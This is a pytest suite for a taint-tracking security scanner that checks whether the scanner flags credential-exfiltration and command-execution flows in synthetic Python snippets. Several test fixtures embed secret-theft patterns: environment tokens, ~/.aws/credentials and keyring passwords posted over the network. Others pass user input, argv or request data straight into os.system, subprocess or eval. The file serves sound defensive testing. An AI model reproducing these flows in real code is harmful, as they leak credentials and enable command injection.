#!/usr/bin/env python3
"""Tests for the taint-tracking (dataflow) scanner.

Each test writes a small synthetic .py file to a tmp_path and scans it via the
real scan_file(Path) entry point, then asserts on rule_ids. Positive cases must
fire exactly the expected rule; negative (benign) cases must produce 0 findings
so the scanner stays precise and does not flood real scans.
"""

from pathlib import Path

import pytest

from medusa.scanners.taint_scanner import TaintScanner


def _scan(tmp_path: Path, code: str) -> list:
    f = tmp_path / "sample.py"
    f.write_text(code)
    result = TaintScanner().scan_file(f)
    assert result.success
    return result.issues


def _rule_ids(issues) -> set:
    return {i.rule_id for i in issues}


# ---------------------------------------------------------------------------
# Positive: credential source -> network sink == EXFIL-001
# ---------------------------------------------------------------------------

def test_env_secret_to_requests_post(tmp_path):
    code = (
        "import os, requests\n"
        "def f(url):\n"
        "    tok = os.getenv('AWS_SECRET')\n"
        "    requests.post(url, data=tok)\n"
    )
    ids = _rule_ids(_scan(tmp_path, code))
    assert "MEDUSA-TAINT-EXFIL-001" in ids


def test_env_secret_via_fstring_to_requests(tmp_path):
    code = (
        "import os, requests\n"
        "def f(url):\n"
        "    tok = os.getenv('GITHUB_TOKEN')\n"
        "    body = f'token={tok}'\n"
        "    requests.post(url, data=body)\n"
    )
    assert "MEDUSA-TAINT-EXFIL-001" in _rule_ids(_scan(tmp_path, code))


def test_credential_file_read_to_urlopen(tmp_path):
    code = (
        "import urllib.request\n"
        "def f(url):\n"
        "    creds = open('/home/u/.aws/credentials').read()\n"
        "    urllib.request.urlopen(url + creds)\n"
    )
    assert "MEDUSA-TAINT-EXFIL-001" in _rule_ids(_scan(tmp_path, code))


def test_keyring_secret_to_httpx(tmp_path):
    code = (
        "import keyring, httpx\n"
        "def f(url):\n"
        "    pw = keyring.get_password('svc', 'user')\n"
        "    httpx.post(url, json={'p': pw})\n"
    )
    assert "MEDUSA-TAINT-EXFIL-001" in _rule_ids(_scan(tmp_path, code))


# ---------------------------------------------------------------------------
# Positive: untrusted input -> exec/subprocess sink == EXEC-001
# ---------------------------------------------------------------------------

def test_input_to_os_system(tmp_path):
    code = (
        "import os\n"
        "def f():\n"
        "    cmd = input()\n"
        "    os.system(cmd)\n"
    )
    assert "MEDUSA-TAINT-EXEC-001" in _rule_ids(_scan(tmp_path, code))


def test_argv_to_subprocess(tmp_path):
    code = (
        "import sys, subprocess\n"
        "def f():\n"
        "    arg = sys.argv[1]\n"
        "    subprocess.run(arg)\n"
    )
    assert "MEDUSA-TAINT-EXEC-001" in _rule_ids(_scan(tmp_path, code))


def test_web_request_to_eval(tmp_path):
    code = (
        "def handler(request):\n"
        "    expr = request.args['q']\n"
        "    eval(expr)\n"
    )
    assert "MEDUSA-TAINT-EXEC-001" in _rule_ids(_scan(tmp_path, code))


# ---------------------------------------------------------------------------
# Negative: benign flows must produce ZERO findings
# ---------------------------------------------------------------------------

def test_getenv_then_print_no_sink(tmp_path):
    code = (
        "import os\n"
        "def f():\n"
        "    tok = os.getenv('AWS_SECRET')\n"
        "    print(tok)\n"
    )
    assert _scan(tmp_path, code) == []


def test_requests_post_literal_body(tmp_path):
    code = (
        "import requests\n"
        "def f(url):\n"
        "    requests.post(url, data='ping')\n"
    )
    assert _scan(tmp_path, code) == []


def test_input_int_then_use_no_exec(tmp_path):
    # input() coerced to int and used in arithmetic; never reaches a sink.
    code = (
        "def f():\n"
        "    n = int(input())\n"
        "    total = n + 1\n"
        "    return total\n"
    )
    assert _scan(tmp_path, code) == []


def test_file_read_logged_locally_no_sink(tmp_path):
    code = (
        "import logging\n"
        "def f():\n"
        "    data = open('/etc/hosts').read()\n"
        "    logging.info(data)\n"
    )
    assert _scan(tmp_path, code) == []


def test_constant_to_subprocess_no_exec(tmp_path):
    code = (
        "import subprocess\n"
        "def f():\n"
        "    subprocess.run(['ls', '-la'])\n"
    )
    assert _scan(tmp_path, code) == []


def test_credential_to_exec_is_not_exfil_or_exec(tmp_path):
    # A credential source reaching an exec sink should NOT fire EXEC-001
    # (that rule is for untrusted input), and not EXFIL-001 (no network sink).
    code = (
        "import os\n"
        "def f():\n"
        "    tok = os.getenv('AWS_SECRET')\n"
        "    os.system(tok)\n"
    )
    assert "MEDUSA-TAINT-EXEC-001" not in _rule_ids(_scan(tmp_path, code))


def test_input_to_network_is_not_exfil(tmp_path):
    # Untrusted input flowing to a network sink is not credential exfiltration.
    code = (
        "import requests\n"
        "def handler(request):\n"
        "    q = request.args['q']\n"
        "    requests.get('http://x', params={'q': q})\n"
    )
    assert "MEDUSA-TAINT-EXFIL-001" not in _rule_ids(_scan(tmp_path, code))


def test_taint_does_not_cross_functions(tmp_path):
    # Taint introduced in one function must not leak into another.
    code = (
        "import os, requests\n"
        "def a():\n"
        "    tok = os.getenv('AWS_SECRET')\n"
        "    return tok\n"
        "def b(url):\n"
        "    requests.post(url, data='clean')\n"
    )
    assert _scan(tmp_path, code) == []


def test_syntax_error_returns_no_issues(tmp_path):
    f = tmp_path / "broken.py"
    f.write_text("def f(:\n    pass\n")
    result = TaintScanner().scan_file(f)
    assert result.success
    assert result.issues == []


# ---------------------------------------------------------------------------
# Module-level (no enclosing function) flow is also analysed
# ---------------------------------------------------------------------------

def test_module_level_exfil(tmp_path):
    code = (
        "import os, requests\n"
        "tok = os.getenv('SECRET_KEY')\n"
        "requests.post('http://x', data=tok)\n"
    )
    assert "MEDUSA-TAINT-EXFIL-001" in _rule_ids(_scan(tmp_path, code))


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-q"]))
